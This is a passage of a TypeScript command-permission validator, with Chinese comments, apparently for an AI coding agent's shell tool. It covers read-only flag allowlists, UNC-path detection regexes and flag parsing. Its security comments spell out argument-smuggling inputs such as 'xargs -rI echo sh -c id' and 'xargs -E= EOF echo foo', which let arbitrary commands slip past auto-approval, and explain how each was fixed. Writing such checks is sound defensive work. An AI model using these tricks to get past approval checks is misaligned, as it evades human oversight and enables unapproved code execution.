    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue view 是只读的 — 显示 issue 详情
  'gh issue view': {
    safeFlags: {
      '--json': 'string',
      '--comments': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue list 是只读的 — 列出 issues
  'gh issue list': {
    safeFlags: {
      '--state': 'string',
      '-s': 'string',
      '--assignee': 'string',
      '--author': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--milestone': 'string',
      '--search': 'string',
      '--json': 'string',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh repo view 是只读的 — 显示仓库详情
  // 注意：gh repo view 使用位置参数，不使用 --repo/-R 标志
  'gh repo view': {
    safeFlags: {
      '--json': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run list 是只读的 — 列出工作流运行
  'gh run list': {
    safeFlags: {
      '--branch': 'string', // 按分支过滤
      '-b': 'string',
      '--status': 'string', // 按状态过滤
      '-s': 'string',
      '--workflow': 'string', // 按工作流过滤
      '-w': 'string', // 注意：这里 -w 是 --workflow，不是 --web（gh run list 没有 --web）
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
      '--event': 'string', // 按事件类型过滤
      '-e': 'string',
      '--user': 'string', // 按用户过滤
      '-u': 'string',
      '--created': 'string', // 按创建日期过滤
      '--commit': 'string', // 按提交 SHA 过滤
      '-c': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run view 是只读的 — 显示工作流运行的详情
  'gh run view': {
    safeFlags: {
      '--log': 'none', // 显示完整运行日志
      '--log-failed': 'none', // 仅显示失败步骤的日志
      '--exit-status': 'none', // 以运行的状态码退出
      '--verbose': 'none', // 显示作业步骤
      '-v': 'none', // 注意：这里 -v 是 --verbose，不是 --web
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
      '--job': 'string', // 按 ID 查看特定作业
      '-j': 'string',
      '--attempt': 'number', // 查看特定尝试
      '-a': 'number',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh auth status 是只读的 — 显示认证状态
  // 注意：--show-token/-t 被故意排除（泄露密钥）
  'gh auth status': {
    safeFlags: {
      '--active': 'none', // 仅显示活跃账户
      '-a': 'none',
      '--hostname': 'string', // 检查特定主机名
      '-h': 'string',
      '--json': 'string', // JSON 字段选择
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr status 是只读的 — 显示你的 PR
  'gh pr status': {
    safeFlags: {
      '--conflict-status': 'none', // 显示合并冲突状态
      '-c': 'none',
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue status 是只读的 — 显示你的 issues
  'gh issue status': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release list 是只读的 — 列出发布版本
  'gh release list': {
    safeFlags: {
      '--exclude-drafts': 'none', // 排除草稿发布
      '--exclude-pre-releases': 'none', // 排除预发布
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--order': 'string', // 排序：asc|desc
      '-O': 'string',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release view 是只读的 — 显示发布版本详情
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh release view': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow list 是只读的 — 列出工作流文件
  'gh workflow list': {
    safeFlags: {
      '--all': 'none', // 包含已禁用的工作流
      '-a': 'none',
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow view 是只读的 — 显示工作流摘要
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh workflow view': {
    safeFlags: {
      '--ref': 'string', // 带有工作流版本的分支/标签
      '-r': 'string',
      '--yaml': 'none', // 查看工作流 yaml
      '-y': 'none',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh label list 是只读的 — 列出标签
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh label list': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--order': 'string', // 排序：asc|desc
      '--search': 'string', // 搜索标签名
      '-S': 'string',
      '--sort': 'string', // 排序：created|name
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh search repos 是只读的 — 搜索仓库
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh search repos': {
    safeFlags: {
      '--archived': 'none', // 按归档状态过滤
      '--created': 'string', // 按创建日期过滤
      '--followers': 'string', // 按关注者数过滤
      '--forks': 'string', // 按 fork 数过滤
      '--good-first-issues': 'string', // 按 good first issues 过滤
      '--help-wanted-issues': 'string', // 按 help wanted issues 过滤
      '--include-forks': 'string', // 包含 fork：false|true|only
      '--json': 'string', // JSON 字段选择
      '--language': 'string', // 按语言过滤
      '--license': 'string', // 按许可证过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--match': 'string', // 限制字段：name|description|readme
      '--number-topics': 'string', // 按主题数过滤
      '--order': 'string', // 排序：asc|desc
      '--owner': 'string', // 按所有者过滤
      '--size': 'string', // 按大小范围过滤
      '--sort': 'string', // 排序：forks|help-wanted-issues|stars|updated
      '--stars': 'string', // 按星标数过滤
      '--topic': 'string', // 按主题过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search issues 是只读的 — 搜索 issues
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh search issues': {
    safeFlags: {
      '--app': 'string', // 按 GitHub App 作者过滤
      '--assignee': 'string', // 按指派人过滤
      '--author': 'string', // 按作者过滤
      '--closed': 'string', // 按关闭日期过滤
      '--commenter': 'string', // 按评论者过滤
      '--comments': 'string', // 按评论数过滤
      '--created': 'string', // 按创建日期过滤
      '--include-prs': 'none', // 在结果中包含 PR
      '--interactions': 'string', // 按互动数过滤
      '--involves': 'string', // 按参与度过滤
      '--json': 'string', // JSON 字段选择
      '--label': 'string', // 按标签过滤
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--locked': 'none', // 过滤已锁定的对话
      '--match': 'string', // 限制字段：title|body|comments
      '--mentions': 'string', // 按用户提及过滤
      '--milestone': 'string', // 按里程碑过滤
      '--no-assignee': 'none', // 过滤缺少指派人的
      '--no-label': 'none', // 过滤缺少标签的
      '--no-milestone': 'none', // 过滤缺少里程碑的
      '--no-project': 'none', // 过滤缺少项目的
      '--order': 'string', // 排序：asc|desc
      '--owner': 'string', // 按所有者过滤
      '--project': 'string', // 按项目过滤
      '--reactions': 'string', // 按反应数过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--sort': 'string', // 排序字段
      '--state': 'string', // 过滤：open|closed
      '--team-mentions': 'string', // 按团队提及过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search prs 是只读的 — 搜索拉取请求
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh search prs': {
    safeFlags: {
      '--app': 'string', // 按 GitHub App 作者过滤
      '--assignee': 'string', // 按指派人过滤
      '--author': 'string', // 按作者过滤
      '--base': 'string', // 按基础分支过滤
      '-B': 'string',
      '--checks': 'string', // 按检查状态过滤
      '--closed': 'string', // 按关闭日期过滤
      '--commenter': 'string', // 按评论者过滤
      '--comments': 'string', // 按评论数过滤
      '--created': 'string', // 按创建日期过滤
      '--draft': 'none', // 过滤草稿 PR
      '--head': 'string', // 按 head 分支过滤
      '-H': 'string',
      '--interactions': 'string', // 按互动数过滤
      '--involves': 'string', // 按参与度过滤
      '--json': 'string', // JSON 字段选择
      '--label': 'string', // 按标签过滤
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--locked': 'none', // 过滤已锁定的对话
      '--match': 'string', // 限制字段：title|body|comments
      '--mentions': 'string', // 按用户提及过滤
      '--merged': 'none', // 过滤已合并 PR
      '--merged-at': 'string', // 按合并日期过滤
      '--milestone': 'string', // 按里程碑过滤
      '--no-assignee': 'none', // 过滤缺少指派人的
      '--no-label': 'none', // 过滤缺少标签的
      '--no-milestone': 'none', // 过滤缺少里程碑的
      '--no-project': 'none', // 过滤缺少项目的
      '--order': 'string', // 排序：asc|desc
      '--owner': 'string', // 按所有者过滤
      '--project': 'string', // 按项目过滤
      '--reactions': 'string', // 按反应数过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--review': 'string', // 按审查状态过滤
      '--review-requested': 'string', // 按请求审查过滤
      '--reviewed-by': 'string', // 按审查者过滤
      '--sort': 'string', // 排序字段
      '--state': 'string', // 过滤：open|closed
      '--team-mentions': 'string', // 按团队提及过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search commits 是只读的 — 搜索提交
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh search commits': {
    safeFlags: {
      '--author': 'string', // 按作者过滤
      '--author-date': 'string', // 按作者日期过滤
      '--author-email': 'string', // 按作者邮箱过滤
      '--author-name': 'string', // 按作者姓名过滤
      '--committer': 'string', // 按提交者过滤
      '--committer-date': 'string', // 按提交日期过滤
      '--committer-email': 'string', // 按提交者过滤 email
      '--committer-name': 'string', // 按提交者过滤 name
      '--hash': 'string', // 按提交哈希过滤
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--merge': 'none', // 过滤合并提交
      '--order': 'string', // 排序：asc|desc
      '--owner': 'string', // 按所有者过滤
      '--parent': 'string', // 按父提交哈希过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--sort': 'string', // 排序：author-date|committer-date
      '--tree': 'string', // 按 tree 哈希过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search code 是只读的 — 搜索代码
  // 注意：--web/-w 被故意排除（打开浏览器）
  'gh search code': {
    safeFlags: {
      '--extension': 'string', // 按文件扩展名过滤
      '--filename': 'string', // 按文件名过滤
      '--json': 'string', // JSON 字段选择
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--match': 'string', // 限制：file|path
      '--owner': 'string', // 按所有者过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--size': 'string', // 按大小范围过滤
    },
  },
}

// ---------------------------------------------------------------------------
// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs 只读命令
// ---------------------------------------------------------------------------

export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'docker logs': {
    safeFlags: {
      '--follow': 'none',
      '-f': 'none',
      '--tail': 'string',
      '-n': 'string',
      '--timestamps': 'none',
      '-t': 'none',
      '--since': 'string',
      '--until': 'string',
      '--details': 'none',
    },
  },
  'docker inspect': {
    safeFlags: {
      '--format': 'string',
      '-f': 'string',
      '--type': 'string',
      '--size': 'none',
      '-s': 'none',
    },
  },
}

// ---------------------------------------------------------------------------
// RIPGREP_READ_ONLY_COMMANDS — rg (ripgrep) 只读搜索
// ---------------------------------------------------------------------------

export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  rg: {
    safeFlags: {
      // 模式标志
      '-e': 'string', // 要搜索的模式
      '--regexp': 'string',
      '-f': 'string', // 从文件读取模式

      // 常用搜索选项
      '-i': 'none', // 不区分大小写
      '--ignore-case': 'none',
      '-S': 'none', // 智能大小写
      '--smart-case': 'none',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-w': 'none', // 词正则
      '--word-regexp': 'none',
      '-v': 'none', // 反向匹配
      '--invert-match': 'none',

      // 输出选项
      '-c': 'none', // 计数匹配
      '--count': 'none',
      '-l': 'none', // 匹配的文件
      '--files-with-matches': 'none',
      '--files-without-match': 'none',
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-o': 'none', // 仅匹配部分
      '--only-matching': 'none',
      '-A': 'number', // 后文
      '--after-context': 'number',
      '-B': 'number', // 前文
      '--before-context': 'number',
      '-C': 'number', // 上下文
      '--context': 'number',
      '-H': 'none', // 含文件名
      '-h': 'none', // 无文件名
      '--heading': 'none',
      '--no-heading': 'none',
      '-q': 'none', // 静默
      '--quiet': 'none',
      '--column': 'none',

      // 文件过滤
      '-g': 'string', // Glob 模式
      '--glob': 'string',
      '-t': 'string', // 类型
      '--type': 'string',
      '-T': 'string', // 类型 not
      '--type-not': 'string',
      '--type-list': 'none',
      '--hidden': 'none',
      '--no-ignore': 'none',
      '-u': 'none', // 无限制

      // 常用选项
      '-m': 'number', // 每文件最大计数
      '--max-count': 'number',
      '-d': 'number', // 最大深度
      '--max-depth': 'number',
      '-a': 'none', // 文本（搜索二进制文件）
      '--text': 'none',
      '-z': 'none', // 搜索 zip
      '-L': 'none', // 跟随符号链接
      '--follow': 'none',

      // 显示选项
      '--color': 'string',
      '--json': 'none',
      '--stats': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
      '--debug': 'none',

      // 特殊参数分隔符
      '--': 'none',
    },
  },
}

// ---------------------------------------------------------------------------
// PYRIGHT_READ_ONLY_COMMANDS — pyright 静态类型检查器
// ---------------------------------------------------------------------------

export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  pyright: {
    respectsDoubleDash: false, // pyright 将 -- 视为文件路径，而非选项结束符
    safeFlags: {
      '--outputjson': 'none',
      '--project': 'string',
      '-p': 'string',
      '--pythonversion': 'string',
      '--pythonplatform': 'string',
      '--typeshedpath': 'string',
      '--venvpath': 'string',
      '--level': 'string',
      '--stats': 'none',
      '--verbose': 'none',
      '--version': 'none',
      '--dependencies': 'none',
      '--warnings': 'none',
    },
    additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
      // 检查 --watch 或 -w 是否作为独立标记（标志）出现
      return args.some((t) => t === '--watch' || t === '-w')
    },
  },
}

// ---------------------------------------------------------------------------
// EXTERNAL_READONLY_COMMANDS — 跨 shell 只读命令
// 仅包含在 Windows 上 bash 和 PowerShell 中行为完全相同的命令。
// Unix 特有命令（cat、head、wc 等）属于 BashTool 的 READONLY_COMMANDS。
// ---------------------------------------------------------------------------

export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
  // 在 Windows 上 bash 和 PowerShell 中行为相同的跨平台外部工具
  'docker ps',
  'docker images',
] as const

// ---------------------------------------------------------------------------
// UNC 路径检测（在 Bash 和 PowerShell 之间共享）
// ---------------------------------------------------------------------------

/**
 * 检查路径或命令是否包含可能触发网络请求的 UNC 路径
 * （NTLM/Kerberos 凭据泄露、WebDAV 攻击）。
 *
 * 此函数检测：
 * - 基本 UNC 路径：\\server\share、\\foo.com\file
 * - WebDAV 模式：\\server@SSL@8443\、\\server@8443@SSL\、\\server\DavWWWRoot\
 * - 基于 IP 的 UNC：\\192.168.1.1\share、\\[2001:db8::1]\share
 * - 正斜杠变体：//server/share
 *
 * @param pathOrCommand 要检查的路径或命令字符串
 * @returns 如果路径/命令包含潜在易受攻击的 UNC 路径则返回 true
 */
export function containsVulnerableUncPath(pathOrCommand: string): boolean {
  // 仅在 Windows 平台检查
  if (getPlatform() !== 'windows') {
    return false
  }

  // 1. 检查带反斜杠的通用 UNC 路径
  // 匹配模式：\\server、\\server\share、\\server/share、\\server@port\share
  // 使用 [^\s\\/]+ 匹配主机名以捕获 Unicode 同形异义字和其他非 ASCII 字符
  // 尾部接受 \ 和 / 因为 Windows 将两者都视为路径分隔符
  const backslashUncPattern = /\\\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
  if (backslashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 2. 检查正斜杠 UNC 路径
  // 匹配模式：//server、//server/share、//server\share、//192.168.1.1/share
  // 使用否定后行断言 (?<!:) 排除 URL（https://、http://、ftp://）
  // 同时捕获引号、= 或其他非冒号字符之前的 //
  // 尾部接受 / 和 \ 因为 Windows 将两者都视为路径分隔符
  const forwardSlashUncPattern =
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() on short command strings
    /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
  if (forwardSlashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 3. 检查混合分隔符 UNC 路径（正斜杠 + 反斜杠）
  // 在 Windows/Cygwin 上，/\ 等价于 //，因为两者都是路径分隔符。
  // 在 bash 中，/\\server 经过转义处理后变为 /\server，即 UNC 路径。
  // 需要 / 之后有 2+ 个反斜杠，因为单个反斜杠只是转义下一个字符
  // (e.g., /\a → /a after bash processing, which is NOT a UNC path).
  const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/
  if (mixedSlashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 4. 检查混合分隔符 UNC 路径（反斜杠 + 正斜杠）
  // \\/server 在 bash 中经过转义处理后变为 \/server，即 UNC 路径
  // 在 Windows 上因为 \ 和 / 都是路径分隔符。
  const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/
  if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 5. 检查 WebDAV SSL/端口模式
  // 示例：\\server@SSL@8443\path、\\server@8443@SSL\path
  if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
    return true
  }

  // 6. 检查 DavWWWRoot 标记（Windows WebDAV 重定向器）
  // 示例：\\server\DavWWWRoot\path
  if (/DavWWWRoot/i.test(pathOrCommand)) {
    return true
  }

  // 7. 检查带 IPv4 地址的 UNC 路径（纵深防御的显式检查）
  // 示例：\\192.168.1.1\share、\\10.0.0.1\path
  if (
    /^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
    /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)
  ) {
    return true
  }

  // 8. 检查带方括号 IPv6 地址的 UNC 路径（纵深防御的显式检查）
  // 示例：\\[2001:db8::1]\share、\\[::1]\path
  if (
    /^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
    /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)
  ) {
    return true
  }

  return false
}

// ---------------------------------------------------------------------------
// 标志验证工具
// ---------------------------------------------------------------------------

// 匹配有效标志名的正则模式（字母、数字、下划线、连字符）
export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/

/**
 * 根据预期类型验证标志参数
 */
export function validateFlagArgument(value: string, argType: FlagArgType): boolean {
  switch (argType) {
    case 'none':
      return false // 不应为 'none' 类型调用此函数
    case 'number':
      return /^\d+$/.test(value)
    case 'string':
      return true // 任何字符串包括空字符串都有效
    case 'char':
      return value.length === 1
    case '{}':
      return value === '{}'
    case 'EOF':
      return value === 'EOF'
    default:
      return false
  }
}

/**
 * 验证标记化命令的标志/参数部分是否符合配置。
 * 这是从 BashTool 的 isCommandSafeViaFlagParsing 中提取的标志遍历循环。
 *
 * @param tokens - 预标记化的参数（来自 bash shell-quote 或 PowerShell AST）
 * @param startIndex - 开始验证的位置（在命令标记之后）
 * @param config - 安全标志配置
 * @param options.commandName - 用于命令特定处理（git 数字简写、grep/rg 附加数字）
 * @param options.rawCommand - 用于 additionalCommandIsDangerousCallback
 * @param options.xargsTargetCommands - 如果提供，启用 xargs 风格的目标命令检测
 * @returns 如果所有标志都有效则返回 true，否则返回 false
 */
export function validateFlags(
  tokens: string[],
  startIndex: number,
  config: ExternalCommandConfig,
  options?: {
    commandName?: string
    rawCommand?: string
    xargsTargetCommands?: string[]
  },
): boolean {
  let i = startIndex

  while (i < tokens.length) {
    let token = tokens[i]
    if (!token) {
      i++
      continue
    }

    // xargs 的特殊处理：找到目标命令后停止验证标志
    if (
      options?.xargsTargetCommands &&
      options.commandName === 'xargs' &&
      (!token.startsWith('-') || token === '--')
    ) {
      if (token === '--' && i + 1 < tokens.length) {
        i++
        token = tokens[i]
      }
      if (token && options.xargsTargetCommands.includes(token)) {
        break
      }
      return false
    }

    if (token === '--') {
      // 安全说明：仅在工具遵循 POSIX `--` 时中断（默认：true）。
      // 像 pyright 这样的工具不遵循 `--` — 它们将其视为文件路径
      // 并继续将后续标记作为标志处理。在此中断
      // 会让 `pyright -- --createstub os` 自动批准一个文件写入标志。
      if (config.respectsDoubleDash !== false) {
        i++
        break // -- 之后的所有内容都是参数
      }
      // 工具不遵循 --：视为位置参数，继续验证
      i++
      continue
    }

    if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
      // 处理 --flag=value 格式
      // 安全说明：单独跟踪标记是否包含 `=`，
      // 与值是否非空分开。`-E=` 有 `hasEquals=true` 但
      // `inlineValue=''`（falsy）。没有 `hasEquals` 时，在
      // ~1813 行的 falsy 检查会穿透到"消耗下一个标记" — 但 GNU
      // getopt 对于带必填参数的短选项将 `-E=` 视为 `-E` 带
      // 附加参数 `=`（它不为短选项去除 `=`）。解析器
      // 差异：验证器前进 2 个标记，GNU 前进 1 个。
      //
      // 攻击：`xargs -E= EOF echo foo`（零权限）
      //   验证器：inlineValue='' falsy → 消耗 EOF 作为 -E 参数 → i+=2 →
      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → 自动允许
      //   GNU xargs：-E 附加参数=`=` → EOF 是目标命令 → 代码执行
      //
      // 修复：当 hasEquals 为 true 时，使用 inlineValue（即使为空）作为
      // 提供的参数。validateFlagArgument('', 'EOF') → false → 拒绝。
      // 这对所有参数类型都正确：用户明确输入了 `=`，
      // 表明他们提供了一个值（空）。不消耗下一个标记。
      const hasEquals = token.includes('=')
      const [flag, ...valueParts] = token.split('=')
      const inlineValue = valueParts.join('=')

      if (!flag) {
        return false
      }

      const flagArgType = config.safeFlags[flag]

      if (!flagArgType) {
        // 特殊情况：git 命令支持 -<number> 作为 -n <number> 的简写
        if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
          // 这等价于 -n 标志，对 git log/diff/show 是安全的
          i++
          continue
        }

        // 处理直接附加数字参数的标志（如 -A20、-B10）
        // 仅对 grep 和 rg 命令应用此特殊处理
        if (
          (options?.commandName === 'grep' || options?.commandName === 'rg') &&
          flag.startsWith('-') &&
          !flag.startsWith('--') &&
          flag.length > 2
        ) {
          const potentialFlag = flag.substring(0, 2) // 如 '-A20' 中的 '-A'
          const potentialValue = flag.substring(2) // 如 '-A20' 中的 '20'

          if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
            // 这是带附加数字参数的标志
            const flagArgType = config.safeFlags[potentialFlag]
            if (flagArgType === 'number' || flagArgType === 'string') {
              // 验证数字值
              if (validateFlagArgument(potentialValue, flagArgType)) {
                i++
                continue
              } else {
                return false // 无效的附加值
              }
            }
          }
        }

        // 处理组合单字母标志如 -nr
        // 安全说明：我们绝不能允许任何组合中需要参数的标志。
        // GNU getopt 组合语义：当需要参数的选项出现在组合的最后
        // 且没有尾随字符时，下一个 argv 元素被消耗
        // 作为其参数。所以 `xargs -rI echo sh -c id` 被 xargs 解析为：
        //   -r（无参数）+ -I 替换字符串=`echo`，目标=`sh -c id`
        // 我们之前的简单处理器只检查 safeFlags 中的存在性（
        // `-r: 'none'` 和 `-I: '{}'` 都为 truthy），然后 `i++` 消耗一个标记。
        // 这造成了解析器差异：我们的验证器认为 `echo` 是
        // xargs 目标（在 SAFE_TARGET_COMMANDS_FOR_XARGS 中 → break），但
        // xargs 运行了 `sh -c id`。仅需 Bash(echo:*) 或更少权限即可任意 RCE。
        //
        // 修复：要求所有组合标志的参数类型为 'none'。如果任何组合
        // 标志需要参数（非 'none' 类型），拒绝整个组合。
        // 这是保守的 — 它完全阻止 `-rI`（xargs），但那是
        // 安全的方向。需要 `-I` 的用户可以不组合使用：`-r -I {}`。
        if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
          for (let j = 1; j < flag.length; j++) {
            const singleFlag = `-${flag[j]}`
            const flagType = config.safeFlags[singleFlag]
            if (!flagType) {
              return false // 组合标志中有一个不安全
            }
            // 安全说明：组合标志必须是无参数类型。需要参数的标志
            // 在组合中会消耗 GNU getopt 的下一个标记，而我们的
            // 处理器未建模此行为。拒绝以避免解析器差异。
            if (flagType !== 'none') {
              return false // 组合中有需要参数的标志 — 无法安全验证
            }
          }
          i++
          continue
        } else {
          return false // 未知标志
        }
      }

      // 验证标志参数
      if (flagArgType === 'none') {
        // 安全说明：hasEquals 覆盖 `-FLAG=`（空内联值）。没有它，
        // 'none' 类型的 `-FLAG=` 会通过（inlineValue='' 是 falsy）。
        if (hasEquals) {
          return false // 标志不应有值
        }
        i++
      } else {
        let argValue: string
        // 安全说明：使用 hasEquals（而非 inlineValue 真值性）。`-E=` 不能
        // 消耗下一个标记 — 用户明确提供了空值。
        if (hasEquals) {
          argValue = inlineValue
          i++
        } else {
          // 检查下一个标记是否为参数
          if (
            i + 1 >= tokens.length ||
            (tokens[i + 1] &&
              tokens[i + 1]!.startsWith('-') &&
              tokens[i + 1]!.length > 1 &&
              FLAG_PATTERN.test(tokens[i + 1]!))
          ) {
            return false // 缺少必需参数
          }
          argValue = tokens[i + 1] || ''
          i += 2
        }

        // 纵深防御：对于字符串参数，拒绝以 '-' 开头的值
        // 这防止类型混淆攻击，即标记为 'string' 的标志
        // 实际上不接受参数时可能被用于注入危险标志
        // 例外：git 的 --sort 标志可以有以 '-' 开头的值用于反向排序
        if (flagArgType === 'string' && argValue.startsWith('-')) {
          // 特殊情况：git 的 --sort 标志允许 - 前缀用于反向排序
          if (flag === '--sort' && options?.commandName === 'git' && argValue.match(/^-[a-zA-Z]/)) {
            // 这看起来像反向排序（如 -refname、-version:refname）
            // 如果其余部分看起来像有效的排序键则允许
          } else {
            return false
          }
        }

        // 根据类型验证参数
        if (!validateFlagArgument(argValue, flagArgType)) {
          return false
        }
      }
    } else {
      // 非标志参数（如修订规格、文件路径等）- 这是允许的
      i++
    }
  }

  return true
}
